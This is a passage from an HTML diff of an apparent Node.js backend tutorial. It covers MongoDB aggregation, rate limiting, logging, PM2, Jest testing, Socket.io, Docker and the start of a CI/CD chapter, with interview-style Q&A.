+    <pre>Model.<span class="fn">aggregate</span>([
+  { <span class="prop">$match</span>:   { <span class="cm">/* filter documents (like .find())</span> */ } },
+  { <span class="prop">$lookup</span>:  { <span class="cm">/* join another collection */</span> } },
+  { <span class="prop">$unwind</span>:  { <span class="cm">/* flatten an array field */</span> } },
+  { <span class="prop">$group</span>:   { <span class="cm">/* group and aggregate (count, sum, avg) */</span> } },
+  { <span class="prop">$project</span>: { <span class="cm">/* select/rename/compute fields */</span> } },
+  { <span class="prop">$sort</span>:    { <span class="cm">/* sort results */</span> } },
+  { <span class="prop">$limit</span>:   <span class="num">10</span> },   <span class="cm">// only take 10</span>
+  { <span class="prop">$skip</span>:    <span class="num">20</span> },   <span class="cm">// skip first 20 (pagination)</span>
+])</pre>
+  </div>
+
+  <h3>Key Stages with Examples</h3>
+  <div class="codeblock">
+    <div class="codeblock-header">$match — filter (always put this first to reduce documents early)</div>
+    <pre>{ <span class="prop">$match</span>: { isPublished: <span class="kw">true</span>, views: { <span class="prop">$gte</span>: <span class="num">1000</span> } } }
+<span class="cm">// Only keep videos that are published AND have 1000+ views</span></pre>
+  </div>
+  <div class="codeblock">
+    <div class="codeblock-header">$lookup — JOIN another collection</div>
+    <pre>{ <span class="prop">$lookup</span>: {
+  from:         <span class="str">"users"</span>,          <span class="cm">// collection to join (lowercase plural)</span>
+  localField:   <span class="str">"owner"</span>,         <span class="cm">// field in current doc (ObjectId)</span>
+  foreignField: <span class="str">"_id"</span>,           <span class="cm">// field in users collection</span>
+  as:           <span class="str">"ownerDetails"</span>   <span class="cm">// name for the joined array</span>
+}}
+<span class="cm">// Result: ownerDetails is an ARRAY (even for one user)</span>
+<span class="cm">// Use $unwind next to flatten it to a single object</span></pre>
+  </div>
+  <div class="codeblock">
+    <div class="codeblock-header">$group — count, sum, average</div>
+    <pre>{ <span class="prop">$group</span>: {
+  _id:        <span class="str">"$owner"</span>,          <span class="cm">// group by this field</span>
+  totalVideos:{ <span class="prop">$sum</span>: <span class="num">1</span> },       <span class="cm">// count documents per group</span>
+  totalViews: { <span class="prop">$sum</span>: <span class="str">"$views"</span> }, <span class="cm">// sum the views field</span>
+  avgViews:   { <span class="prop">$avg</span>: <span class="str">"$views"</span> }  <span class="cm">// average views per user</span>
+}}</pre>
+  </div>
+  <div class="codeblock">
+    <div class="codeblock-header">$project — shape the output</div>
+    <pre>{ <span class="prop">$project</span>: {
+  title:    <span class="num">1</span>,                         <span class="cm">// include</span>
+  password: <span class="num">0</span>,                         <span class="cm">// exclude</span>
+  fullName: { <span class="prop">$concat</span>: [<span class="str">"$firstName"</span>, <span class="str">" "</span>, <span class="str">"$lastName"</span>] }  <span class="cm">// computed</span>
+}}</pre>
+  </div>
+
+  <h3>Real Example: Get User's Channel Profile</h3>
+  <div class="codeblock">
+    <div class="codeblock-header">Get subscriber count + total videos for a user's channel</div>
+    <pre><span class="kw">const</span> <span class="var">channelStats</span> = <span class="kw">await</span> User.<span class="fn">aggregate</span>([
+  { <span class="prop">$match</span>:  { username: username.<span class="fn">toLowerCase</span>() } },
+  { <span class="prop">$lookup</span>: { from: <span class="str">"subscriptions"</span>, localField: <span class="str">"_id"</span>,
+               foreignField: <span class="str">"channel"</span>, as: <span class="str">"subscribers"</span> } },
+  { <span class="prop">$lookup</span>: { from: <span class="str">"videos"</span>, localField: <span class="str">"_id"</span>,
+               foreignField: <span class="str">"owner"</span>, as: <span class="str">"videos"</span> } },
+  { <span class="prop">$addFields</span>: {
+    subscriberCount: { <span class="prop">$size</span>: <span class="str">"$subscribers"</span> },
+    videoCount:      { <span class="prop">$size</span>: <span class="str">"$videos"</span> },
+    isSubscribed:    { <span class="prop">$in</span>: [<span class="var">req</span>.<span class="prop">user</span>?._id, <span class="str">"$subscribers.subscriber"</span>] }
+  }},
+  { <span class="prop">$project</span>: { password: <span class="num">0</span>, refreshToken: <span class="num">0</span>, subscribers: <span class="num">0</span>, videos: <span class="num">0</span> } }
+])</pre>
+  </div>
+
+  <div class="callout interview">
+    <div class="callout-label">Interview Q</div>
+    <p>"When would you use aggregation instead of .find()?" — When you need: joins (lookup), computed fields, grouping/counting, or complex multi-stage filtering. Simple lookups use .find() + .populate(). Aggregation is for analytics, feeds, dashboards, and anything needing more than one collection.</p>
+    <p>"What is $unwind?" — Deconstructs an array field — creates one document per array element. Needed after $lookup because $lookup always returns an array, even for a single matched document.</p>
+  </div>
+</section>
+
+<!-- ═══ CHAPTER 20 ══════════════════════════════════════ -->
+<section class="chapter" id="ch20">
+  <div class="ch-eyebrow">// CH.20</div>
+  <h2>Rate Limiting, Logging &amp; Production Basics</h2>
+  <p class="chapter-desc">The final layer before deployment. Rate limiting stops abuse. Logging helps debug production issues. Environment management separates dev from prod.</p>
+
+  <h3>Rate Limiting (express-rate-limit)</h3>
+  <p>Without rate limiting, one person can hammer your API with 10,000 login attempts per second (brute-force). Rate limiting stops this.</p>
+  <div class="codeblock">
+    <div class="codeblock-header">npm install express-rate-limit — then in app.js</div>
+    <pre><span class="kw">import</span> rateLimit <span class="kw">from</span> <span class="str">"express-rate-limit"</span>
+
+<span class="cm">// Global limiter — 100 requests per 15 minutes per IP</span>
+<span class="kw">const</span> <span class="var">globalLimiter</span> = <span class="fn">rateLimit</span>({
+  windowMs:  <span class="num">15</span> * <span class="num">60</span> * <span class="num">1000</span>,  <span class="cm">// 15 minutes</span>
+  limit:     <span class="num">100</span>,
+  message:   <span class="str">"Too many requests, slow down"</span>,
+  standardHeaders: <span class="kw">true</span>,      <span class="cm">// sends RateLimit-* headers</span>
+})
+
+<span class="cm">// Stricter limiter for auth routes — 5 login attempts per 15 min</span>
+<span class="kw">const</span> <span class="var">authLimiter</span> = <span class="fn">rateLimit</span>({ windowMs: <span class="num">15</span> * <span class="num">60</span> * <span class="num">1000</span>, limit: <span class="num">5</span> })
+
+app.<span class="fn">use</span>(<span class="var">globalLimiter</span>)                             <span class="cm">// all routes</span>
+app.<span class="fn">use</span>(<span class="str">"/api/v1/users/login"</span>, <span class="var">authLimiter</span>)       <span class="cm">// auth only</span></pre>
+  </div>
+
+  <h3>Logging with Morgan (Already Installed)</h3>
+  <div class="codeblock">
+    <div class="codeblock-header">src/app.js</div>
+    <pre><span class="kw">import</span> morgan <span class="kw">from</span> <span class="str">"morgan"</span>
+
+<span class="cm">// Development: colorful detailed logs</span>
+<span class="kw">if</span> (process.env.<span class="prop">NODE_ENV</span> === <span class="str">"development"</span>) {
+  app.<span class="fn">use</span>(<span class="fn">morgan</span>(<span class="str">"dev"</span>))
+  <span class="cm">// Logs: POST /api/v1/users/login 200 45ms</span>
+}
+
+<span class="cm">// Production: combined format for log files</span>
+<span class="kw">if</span> (process.env.<span class="prop">NODE_ENV</span> === <span class="str">"production"</span>) {
+  app.<span class="fn">use</span>(<span class="fn">morgan</span>(<span class="str">"combined"</span>))
+  <span class="cm">// Logs: IP, user agent, request line, status, bytes, referrer</span>
+}</pre>
+  </div>
+
+  <h3>Environment Management</h3>
+  <div class="table-wrap"><table>
+    <tr><th>Environment</th><th>NODE_ENV value</th><th>Behavior</th></tr>
+    <tr><td>Development</td><td><code>"development"</code></td><td>Verbose logs, stack traces in errors, nodemon auto-restart</td></tr>
+    <tr><td>Testing</td><td><code>"test"</code></td><td>Separate test DB, no logs, fast bcrypt (saltRounds=1)</td></tr>
+    <tr><td>Production</td><td><code>"production"</code></td><td>No stack traces in errors, minimal logs, real DB, PM2</td></tr>
+  </table></div>
+  <div class="codeblock">
+    <div class="codeblock-header">.env files per environment</div>
+    <pre>.env               <span class="cm">← local development (in .gitignore)</span>
+.env.production    <span class="cm">← production values (NEVER commit)</span>
+.env.example       <span class="cm">← template with no real values (DO commit)</span>
+
+<span class="cm">// package.json scripts:</span>
+<span class="str">"dev"</span>:   <span class="str">"NODE_ENV=development nodemon src/index.js"</span>
+<span class="str">"start"</span>: <span class="str">"NODE_ENV=production node src/index.js"</span></pre>
+  </div>
+
+  <h3>PM2 — Production Process Manager</h3>
+  <p>Node.js process crashes on unhandled errors. PM2 keeps it alive, restarts on crash, and manages multiple instances.</p>
+  <div class="codeblock">
+    <div class="codeblock-header">Terminal — deploy with PM2</div>
+    <pre><span class="cm"># Install globally</span>
+npm install -g pm2
+
+<span class="cm"># Start your app</span>
+pm2 start src/index.js --name "backend-api"
+
+<span class="cm"># Cluster mode — uses all CPU cores</span>
+pm2 start src/index.js --name "backend-api" -i max
+
+<span class="cm"># Common commands</span>
+pm2 status          <span class="cm">← see all running processes</span>
+pm2 logs            <span class="cm">← see logs</span>
+pm2 restart all     <span class="cm">← restart after code update</span>
+pm2 stop all        <span class="cm">← stop</span>
+pm2 startup         <span class="cm">← auto-start on server reboot</span></pre>
+  </div>
+
+  <h3>Production Checklist</h3>
+  <div class="table-wrap"><table>
+    <tr><th>Item</th><th>Why</th></tr>
+    <tr><td>Set <code>NODE_ENV=production</code></td><td>Express optimizes itself, no stack traces in errors</td></tr>
+    <tr><td>Use strong JWT secrets (32+ chars)</td><td>Short secrets are brute-forceable</td></tr>
+    <tr><td>Enable HTTPS (SSL certificate)</td><td>Required for <code>secure:true</code> cookies to work</td></tr>
+    <tr><td>Set CORS to specific domain</td><td><code>origin: "*"</code> in production = anyone can call your API</td></tr>
+    <tr><td>Add rate limiting</td><td>Brute-force protection on auth routes</td></tr>
+    <tr><td>Use MongoDB Atlas with IP whitelist</td><td>Only your server IP can connect to DB</td></tr>
+    <tr><td>Disable morgan "dev" in production</td><td>Verbose logs fill disk space fast</td></tr>
+    <tr><td>Handle <code>unhandledRejection</code> and <code>uncaughtException</code></td><td>Prevent silent process crashes</td></tr>
+  </table></div>
+
+  <div class="codeblock">
+    <div class="codeblock-header">src/index.js — catch all unhandled errors</div>
+    <pre><span class="cm">// These two catch ANYTHING that escapes normal error handling</span>
+process.<span class="fn">on</span>(<span class="str">"unhandledRejection"</span>, (<span class="var">err</span>) => {
+  console.<span class="fn">error</span>(<span class="str">"Unhandled Rejection:"</span>, <span class="var">err</span>)
+  process.<span class="fn">exit</span>(<span class="num">1</span>)  <span class="cm">// PM2 will restart</span>
+})
+process.<span class="fn">on</span>(<span class="str">"uncaughtException"</span>, (<span class="var">err</span>) => {
+  console.<span class="fn">error</span>(<span class="str">"Uncaught Exception:"</span>, <span class="var">err</span>)
+  process.<span class="fn">exit</span>(<span class="num">1</span>)
+})</pre>
+  </div>
+
+  <div class="callout interview">
+    <div class="callout-label">Interview Q</div>
+    <p>"What is PM2 and why is it used in production?" — Process manager for Node.js. Keeps the app running after crashes (auto-restart), supports cluster mode for using multiple CPU cores, provides log management, and enables zero-downtime reloads.</p>
+    <p>"What is the difference between <code>uncaughtException</code> and <code>unhandledRejection</code>?" — <code>uncaughtException</code>: a synchronous error was thrown and nothing caught it. <code>unhandledRejection</code>: a Promise was rejected and no <code>.catch()</code> handled it. Both should log the error and call <code>process.exit(1)</code>.</p>
+    <p>"Why should CORS not be <code>origin: "*"</code> in production?" — It allows any website to make requests to your API using a visitor's cookies. A malicious site could make requests on behalf of your logged-in users (CSRF-style attack). Always whitelist specific domains in production.</p>
+  </div>
+</section>
+
+
+<!-- ═══ CHAPTER 21 ══════════════════════════════════════ -->
+<section class="chapter" id="ch21">
+  <div class="ch-eyebrow">// CH.21</div>
+  <h2>Testing with Jest</h2>
+  <p class="chapter-desc">Tests catch bugs before users do. For a Node.js backend, you need two kinds: unit tests (one function in isolation) and integration tests (the full HTTP flow). Both use Jest.</p>
+
+  <h3>Install &amp; Configure</h3>
+  <div class="codeblock">
+    <div class="codeblock-header">Terminal</div>
+    <pre>npm install --save-dev jest supertest @types/jest
+
+<span class="cm"># Add to package.json:</span>
+<span class="str">"scripts"</span>: {
+  <span class="str">"test"</span>:    <span class="str">"jest --runInBand"</span>,         <span class="cm">// --runInBand: one test at a time (avoids DB race)</span>
+  <span class="str">"test:w"</span>:  <span class="str">"jest --watch"</span>             <span class="cm">// watch mode during development</span>
+},
+<span class="str">"jest"</span>: {
+  <span class="str">"testEnvironment"</span>: <span class="str">"node"</span>,
+  <span class="str">"transform"</span>: {}                       <span class="cm">// needed for ES modules</span>
+}</pre>
+  </div>
+
+  <h3>Three Types of Tests</h3>
+  <div class="table-wrap"><table>
+    <tr><th>Type</th><th>What it tests</th><th>Tools</th><th>Speed</th></tr>
+    <tr><td>Unit</td><td>One function — no DB, no HTTP</td><td>Jest mocks</td><td>Very fast</td></tr>
+    <tr><td>Integration</td><td>Full HTTP request → DB → response</td><td>Jest + Supertest</td><td>Slower (DB)</td></tr>
+    <tr><td>E2E</td><td>Frontend → backend → DB full loop</td><td>Playwright/Cypress</td><td>Slowest</td></tr>
+  </table></div>
+
+  <h3>Unit Test — Testing a Pure Function</h3>
+  <div class="codeblock">
+    <div class="codeblock-header">src/utils/apiError.test.js</div>
+    <pre><span class="kw">import</span> ApiError <span class="kw">from</span> <span class="str">"./apiError.js"</span>
+
+<span class="fn">describe</span>(<span class="str">"ApiError"</span>, () => {
+  <span class="fn">it</span>(<span class="str">"sets statusCode and message"</span>, () => {
+    <span class="kw">const</span> <span class="var">err</span> = <span class="kw">new</span> <span class="fn">ApiError</span>(<span class="num">404</span>, <span class="str">"Not found"</span>)
+    <span class="fn">expect</span>(<span class="var">err</span>.<span class="prop">code</span>).<span class="fn">toBe</span>(<span class="num">404</span>)
+    <span class="fn">expect</span>(<span class="var">err</span>.<span class="prop">message</span>).<span class="fn">toBe</span>(<span class="str">"Not found"</span>)
+    <span class="fn">expect</span>(<span class="var">err</span>.<span class="prop">success</span>).<span class="fn">toBe</span>(<span class="kw">false</span>)
+    <span class="fn">expect</span>(<span class="var">err</span> <span class="kw">instanceof</span> Error).<span class="fn">toBe</span>(<span class="kw">true</span>)
+  })
+})</pre>
+  </div>
+
+  <h3>Integration Test — HTTP Route with Supertest</h3>
+  <div class="codeblock">
+    <div class="codeblock-header">src/__tests__/user.test.js</div>
+    <pre><span class="kw">import</span> request <span class="kw">from</span> <span class="str">"supertest"</span>
+<span class="kw">import</span> { app } <span class="kw">from</span> <span class="str">"../app.js"</span>
+<span class="kw">import</span> { connectDB } <span class="kw">from</span> <span class="str">"../db/index.js"</span>
+<span class="kw">import</span> mongoose <span class="kw">from</span> <span class="str">"mongoose"</span>
+
+<span class="fn">beforeAll</span>(<span class="kw">async</span> () => {
+  <span class="kw">await</span> <span class="fn">connectDB</span>()  <span class="cm">// connects to test DB (set TEST_MONGODB_URL in .env.test)</span>
+})
+
+<span class="fn">afterAll</span>(<span class="kw">async</span> () => {
+  <span class="kw">await</span> mongoose.connection.<span class="fn">dropDatabase</span>()  <span class="cm">// clean up after tests</span>
+  <span class="kw">await</span> mongoose.connection.<span class="fn">close</span>()
+})
+
+<span class="fn">describe</span>(<span class="str">"POST /api/v1/users/login"</span>, () => {
+  <span class="fn">it</span>(<span class="str">"returns 400 when email is missing"</span>, <span class="kw">async</span> () => {
+    <span class="kw">const</span> <span class="var">res</span> = <span class="kw">await</span> <span class="fn">request</span>(<span class="var">app</span>)
+      .<span class="fn">post</span>(<span class="str">"/api/v1/users/login"</span>)
+      .<span class="fn">send</span>({ password: <span class="str">"Test@1234"</span> })  <span class="cm">// no email or username</span>
+
+    <span class="fn">expect</span>(<span class="var">res</span>.<span class="prop">status</span>).<span class="fn">toBe</span>(<span class="num">400</span>)
+    <span class="fn">expect</span>(<span class="var">res</span>.<span class="prop">body</span>.<span class="prop">success</span>).<span class="fn">toBe</span>(<span class="kw">false</span>)
+  })
+
+  <span class="fn">it</span>(<span class="str">"returns 404 when user does not exist"</span>, <span class="kw">async</span> () => {
+    <span class="kw">const</span> <span class="var">res</span> = <span class="kw">await</span> <span class="fn">request</span>(<span class="var">app</span>)
+      .<span class="fn">post</span>(<span class="str">"/api/v1/users/login"</span>)
+      .<span class="fn">send</span>({ email: <span class="str">"ghost@test.com"</span>, password: <span class="str">"Test@1234"</span> })
+
+    <span class="fn">expect</span>(<span class="var">res</span>.<span class="prop">status</span>).<span class="fn">toBe</span>(<span class="num">404</span>)
+  })
+})</pre>
+  </div>
+
+  <h3>Mocking — Isolate Dependencies</h3>
+  <div class="codeblock">
+    <div class="codeblock-header">Mock Cloudinary so tests don't make real API calls</div>
+    <pre><span class="cm">// At top of test file — replace the real module with a mock</span>
+jest.<span class="fn">mock</span>(<span class="str">"../utils/cloudinary.js"</span>, () => ({
+  uploadToCloudinary: jest.<span class="fn">fn</span>().<span class="fn">mockResolvedValue</span>({
+    url: <span class="str">"https://fake-cloudinary.com/image.jpg"</span>
+  })
+}))
+
+<span class="cm">// Now any call to uploadToCloudinary returns the fake URL instantly</span>
+<span class="cm">// No real HTTP request, no Cloudinary account needed, fast</span></pre>
+  </div>
+
+  <h3>Jest Matcher Reference</h3>
+  <div class="table-wrap"><table>
+    <tr><th>Matcher</th><th>Use case</th></tr>
+    <tr><td><code>.toBe(val)</code></td><td>Strict equality (===). Use for primitives.</td></tr>
+    <tr><td><code>.toEqual(obj)</code></td><td>Deep equality. Use for objects/arrays.</td></tr>
+    <tr><td><code>.toBeTruthy()</code></td><td>Anything truthy (true, non-empty string, object)</td></tr>
+    <tr><td><code>.toBeFalsy()</code></td><td>Falsy values (false, null, undefined, 0, "")</td></tr>
+    <tr><td><code>.toThrow()</code></td><td>Expect function to throw an error</td></tr>
+    <tr><td><code>.toHaveBeenCalledWith(args)</code></td><td>Mock was called with these exact args</td></tr>
+    <tr><td><code>.resolves.toBe(val)</code></td><td>Async: Promise resolves to val</td></tr>
+    <tr><td><code>.rejects.toThrow()</code></td><td>Async: Promise rejects / throws</td></tr>
+  </table></div>
+
+  <div class="callout interview">
+    <div class="callout-label">Interview Q</div>
+    <p>"What is the difference between unit and integration tests?" — Unit: test one function in isolation, mock all dependencies, no DB. Integration: test the full request-response cycle with a real (test) database. Both are needed — unit tests are fast and precise, integration tests catch wiring bugs.</p>
+    <p>"Why use Supertest?" — It lets you make HTTP requests to your Express app without actually starting a server on a port. You pass <code>app</code> directly. Tests are self-contained and run in parallel safely.</p>
+    <p>"What is <code>jest.mock()</code>?" — Replaces a real module with a fake implementation for the duration of the test. Used to mock Cloudinary, email services, external APIs — anything you don't want to hit during tests.</p>
+  </div>
+</section>
+
+<!-- ═══ CHAPTER 22 ══════════════════════════════════════ -->
+<section class="chapter" id="ch22">
+  <div class="ch-eyebrow">// CH.22</div>
+  <h2>WebSockets &amp; Socket.io</h2>
+  <p class="chapter-desc">HTTP is request-response — the client always asks first. WebSockets are bidirectional — the server can push data any time. This is how chat, live notifications, and real-time feeds work.</p>
+
+  <h3>HTTP vs WebSocket</h3>
+  <div class="table-wrap"><table>
+    <tr><th></th><th>HTTP</th><th>WebSocket</th></tr>
+    <tr><td><strong>Direction</strong></td><td>Client → Server (request first)</td><td>Both directions, anytime</td></tr>
+    <tr><td><strong>Connection</strong></td><td>New connection per request</td><td>One persistent connection</td></tr>
+    <tr><td><strong>Use case</strong></td><td>CRUD operations</td><td>Chat, notifications, live data</td></tr>
+    <tr><td><strong>Overhead</strong></td><td>Higher (headers on every request)</td><td>Lower after handshake</td></tr>
+  </table></div>
+
+  <h3>Setup Socket.io with Express</h3>
+  <div class="codeblock">
+    <div class="codeblock-header">Terminal</div>
+    <pre>npm install socket.io</pre>
+  </div>
+  <div class="codeblock">
+    <div class="codeblock-header">src/index.js — wrap app with http server</div>
+    <pre><span class="kw">import</span> http <span class="kw">from</span> <span class="str">"http"</span>
+<span class="kw">import</span> { Server } <span class="kw">from</span> <span class="str">"socket.io"</span>
+<span class="kw">import</span> { app } <span class="kw">from</span> <span class="str">"./app.js"</span>
+
+<span class="kw">const</span> <span class="var">httpServer</span> = http.<span class="fn">createServer</span>(<span class="var">app</span>)  <span class="cm">// wrap express app</span>
+
+<span class="kw">const</span> <span class="var">io</span> = <span class="kw">new</span> <span class="fn">Server</span>(<span class="var">httpServer</span>, {
+  cors: { origin: process.env.<span class="prop">CORS_ORIGIN</span>, credentials: <span class="kw">true</span> }
+})
+
+<span class="cm">// Export io so other files (controllers) can use it</span>
+<span class="kw">export</span> { <span class="var">io</span> }
+
+<span class="var">httpServer</span>.<span class="fn">listen</span>(process.env.<span class="prop">PORT</span>, () => {
+  console.<span class="fn">log</span>(<span class="str">`Server running on port </span><span class="var">${process.env.PORT}</span><span class="str">`</span>)
+})</pre>
+  </div>
+
+  <h3>Server Events</h3>
+  <div class="codeblock">
+    <div class="codeblock-header">src/socket/index.js — socket event handlers</div>
+    <pre><span class="kw">import</span> { <span class="var">io</span> } <span class="kw">from</span> <span class="str">"../index.js"</span>
+
+<span class="var">io</span>.<span class="fn">on</span>(<span class="str">"connection"</span>, (<span class="var">socket</span>) => {
+  console.<span class="fn">log</span>(<span class="str">"User connected:"</span>, <span class="var">socket</span>.<span class="prop">id</span>)
+
+  <span class="cm">// Listen for event from client</span>
+  <span class="var">socket</span>.<span class="fn">on</span>(<span class="str">"sendMessage"</span>, (<span class="var">data</span>) => {
+    console.<span class="fn">log</span>(<span class="str">"Message received:"</span>, <span class="var">data</span>)
+
+    <span class="cm">// Broadcast to everyone in a room</span>
+    <span class="var">io</span>.<span class="fn">to</span>(<span class="var">data</span>.<span class="prop">room</span>).<span class="fn">emit</span>(<span class="str">"receiveMessage"</span>, {
+      message: <span class="var">data</span>.<span class="prop">message</span>,
+      sender:  <span class="var">data</span>.<span class="prop">sender</span>,
+    })
+  })
+
+  <span class="cm">// Join a chat room</span>
+  <span class="var">socket</span>.<span class="fn">on</span>(<span class="str">"joinRoom"</span>, (<span class="var">roomId</span>) => {
+    <span class="var">socket</span>.<span class="fn">join</span>(<span class="var">roomId</span>)
+    console.<span class="fn">log</span>(<span class="var">`Socket ${socket.id} joined room ${roomId}`</span>)
+  })
+
+  <span class="cm">// Handle disconnect</span>
+  <span class="var">socket</span>.<span class="fn">on</span>(<span class="str">"disconnect"</span>, () => {
+    console.<span class="fn">log</span>(<span class="str">"User disconnected:"</span>, <span class="var">socket</span>.<span class="prop">id</span>)
+  })
+})</pre>
+  </div>
+
+  <h3>Emit Cheat Sheet</h3>
+  <div class="table-wrap"><table>
+    <tr><th>Method</th><th>Who receives it</th></tr>
+    <tr><td><code>socket.emit("event", data)</code></td><td>Only this one connected client</td></tr>
+    <tr><td><code>io.emit("event", data)</code></td><td>All connected clients</td></tr>
+    <tr><td><code>io.to(roomId).emit("event", data)</code></td><td>Everyone in this room</td></tr>
+    <tr><td><code>socket.broadcast.emit("event", data)</code></td><td>Everyone except this client</td></tr>
+    <tr><td><code>socket.to(roomId).emit("event", data)</code></td><td>Everyone in room except this client</td></tr>
+  </table></div>
+
+  <h3>Push Notification from an HTTP Controller</h3>
+  <div class="codeblock">
+    <div class="codeblock-header">controllers/video.controller.js — emit when video is published</div>
+    <pre><span class="kw">import</span> { <span class="var">io</span> } <span class="kw">from</span> <span class="str">"../index.js"</span>
+
+<span class="kw">const</span> <span class="fn">publishVideo</span> = <span class="fn">asyncHandler</span>(<span class="kw">async</span> (<span class="var">req</span>, <span class="var">res</span>) => {
+  <span class="kw">const</span> <span class="var">video</span> = <span class="kw">await</span> Video.<span class="fn">findByIdAndUpdate</span>(...)
+  <span class="cm">// Notify all subscribers of this channel in real time</span>
+  <span class="var">io</span>.<span class="fn">to</span>(<span class="str">`channel-</span><span class="var">${req.user._id}</span><span class="str">`</span>).<span class="fn">emit</span>(<span class="str">"newVideo"</span>, { title: <span class="var">video</span>.<span class="prop">title</span> })
+  <span class="kw">return</span> <span class="var">res</span>.<span class="fn">json</span>(<span class="kw">new</span> <span class="fn">ApiResponse</span>(<span class="num">200</span>, <span class="str">"Published"</span>, <span class="var">video</span>))
+})</pre>
+  </div>
+
+  <div class="callout interview">
+    <div class="callout-label">Interview Q</div>
+    <p>"When would you use WebSockets instead of HTTP polling?" — When data changes frequently on the server and clients need updates immediately (chat messages, live notifications, collaborative editing, stock prices). HTTP polling (repeatedly calling GET every few seconds) wastes bandwidth. WebSockets push the data when it's ready.</p>
+    <p>"What is a Socket.io room?" — A named channel that sockets can join/leave. When you emit to a room, only sockets that joined it receive the event. Perfect for chat rooms, private conversations, or per-user notification channels.</p>
+  </div>
+</section>
+
+<!-- ═══ CHAPTER 23 ══════════════════════════════════════ -->
+<section class="chapter" id="ch23">
+  <div class="ch-eyebrow">// CH.23</div>
+  <h2>Docker &amp; docker-compose</h2>
+  <p class="chapter-desc">"It works on my machine" ends here. Docker packages your app and all its dependencies into a container that runs identically everywhere — development, testing, production.</p>
+
+  <h3>Core Concepts</h3>
+  <div class="table-wrap"><table>
+    <tr><th>Concept</th><th>What it is</th><th>Analogy</th></tr>
+    <tr><td>Image</td><td>Blueprint for a container (read-only)</td><td>Recipe</td></tr>
+    <tr><td>Container</td><td>Running instance of an image</td><td>Dish made from the recipe</td></tr>
+    <tr><td>Dockerfile</td><td>Instructions to build an image</td><td>The recipe card itself</td></tr>
+    <tr><td>docker-compose</td><td>Run multiple containers together</td><td>Full restaurant kitchen</td></tr>
+    <tr><td>Volume</td><td>Persistent storage outside the container</td><td>External hard drive</td></tr>
+    <tr><td>Port mapping</td><td>Host port : Container port</td><td>Forwarding your phone calls</td></tr>
+  </table></div>
+
+  <h3>Dockerfile for Node.js App</h3>
+  <div class="codeblock">
+    <div class="codeblock-header">Backend/Dockerfile</div>
+    <pre><span class="cm"># Start from official Node.js image (slim = smaller)</span>
+FROM node:20-alpine
+
+<span class="cm"># Create working directory inside container</span>
+WORKDIR /app
+
+<span class="cm"># Copy package files first (Docker caches this layer)</span>
+<span class="cm"># Only re-runs npm install if package.json changes</span>
+COPY package*.json ./
+RUN npm ci --only=production
+
+<span class="cm"># Copy rest of source code</span>
+COPY . .
+
+<span class="cm"># Your app runs on port 8000 (documentation only — doesn't actually expose it)</span>
+EXPOSE 8000
+
+<span class="cm"># Command to run when container starts</span>
+CMD ["node", "src/index.js"]</pre>
+  </div>
+
+  <h3>.dockerignore — Keep Image Lean</h3>
+  <div class="codeblock">
+    <div class="codeblock-header">Backend/.dockerignore</div>
+    <pre>node_modules
+.env
+.git
+*.log
+public/temp/*</pre>
+  </div>
+
+  <h3>docker-compose.yml — App + MongoDB Together</h3>
+  <div class="codeblock">
+    <div class="codeblock-header">docker-compose.yml (project root)</div>
+    <pre>version: <span class="str">"3.9"</span>
+services:
+
+  <span class="cm"># Your Node.js backend</span>
+  backend:
+    build: ./Backend
+    ports:
+      - <span class="str">"8000:8000"</span>          <span class="cm"># host:container</span>
+    env_file:
+      - ./Backend/.env       <span class="cm"># load env vars from file</span>
+    environment:
+      - MONGODB_URL=mongodb://mongo:27017  <span class="cm"># uses the 'mongo' service name</span>
+    depends_on:
+      - mongo                <span class="cm"># wait for mongo to start first</span>
+    volumes:
+      - ./Backend/public:/app/public  <span class="cm"># persist uploaded files</span>
+
+  <span class="cm"># MongoDB (no setup required — just pull the official image)</span>
+  mongo:
+    image: mongo:7
+    ports:
+      - <span class="str">"27017:27017"</span>
+    volumes:
+      - mongo-data:/data/db  <span class="cm"># data persists even if container restarts</span>
+
+volumes:
+  mongo-data:</pre>
+  </div>
+
+  <h3>Essential Docker Commands</h3>
+  <div class="table-wrap"><table>
+    <tr><th>Command</th><th>What it does</th></tr>
+    <tr><td><code>docker build -t my-app .</code></td><td>Build image from Dockerfile in current dir</td></tr>
+    <tr><td><code>docker run -p 8000:8000 my-app</code></td><td>Run container, map ports</td></tr>
+    <tr><td><code>docker compose up</code></td><td>Start all services from docker-compose.yml</td></tr>
+    <tr><td><code>docker compose up --build</code></td><td>Rebuild images then start</td></tr>
+    <tr><td><code>docker compose down</code></td><td>Stop and remove containers</td></tr>
+    <tr><td><code>docker compose down -v</code></td><td>Stop AND delete volumes (wipes DB data)</td></tr>
+    <tr><td><code>docker ps</code></td><td>List running containers</td></tr>
+    <tr><td><code>docker logs &lt;container&gt;</code></td><td>View container logs</td></tr>
+    <tr><td><code>docker exec -it &lt;container&gt; sh</code></td><td>Open shell inside container</td></tr>
+  </table></div>
+
+  <div class="callout senior">
+    <div class="callout-label">Senior Dev Says</div>
+    <p>Copy <code>package*.json</code> and run <code>npm ci</code> <em>before</em> copying your source code. Docker caches each instruction as a layer. If your source code changes but <code>package.json</code> doesn't, Docker reuses the cached <code>npm ci</code> layer — your image rebuilds in seconds instead of minutes. Order matters.</p>
+  </div>
+
+  <div class="callout interview">
+    <div class="callout-label">Interview Q</div>
+    <p>"What is the difference between an image and a container?" — Image is the read-only blueprint (like a class). Container is a running instance of that image (like an object). You can run many containers from one image.</p>
+    <p>"What is docker-compose used for?" — Orchestrating multiple containers that need to work together (app + database + cache + message queue). Defines the whole environment in one YAML file so anyone can run <code>docker compose up</code> and get a complete working system.</p>
+    <p>"What is a volume in Docker?" — Persistent storage outside the container's filesystem. Without volumes, data inside a container is lost when the container stops. Mount a volume to <code>/data/db</code> in MongoDB to keep your database data across restarts.</p>
+  </div>
+</section>
+
+<!-- ═══ CHAPTER 24 ══════════════════════════════════════ -->
+<section class="chapter" id="ch24">
+  <div class="ch-eyebrow">// CH.24</div>
+  <h2>CI/CD with GitHub Actions</h2>
+  <p class="chapter-desc">CI/CD = every git push automatically runs tests, checks code, and (optionally) deploys. GitHub Actions is free, runs in the cloud, and lives as a YAML file in your repo.</p>
+
+  <h3>What CI/CD Means</h3>
+  <div class="table-wrap"><table>
+    <tr><th>Term</th><th>What it does</th></tr>
+    <tr><td>CI (Continuous Integration)</td><td>Automatically test on every push — catch bugs before merge</td></tr>
+    <tr><td>CD (Continuous Delivery)</td><td>Automatically prepare a release build after tests pass</td></tr>
+    <tr><td>CD (Continuous Deployment)</td><td>Automatically deploy to production after tests pass</td></tr>
+  </table></div>
+
+  <h3>GitHub Actions Core Concepts</h3>
+  <div class="table-wrap"><table>
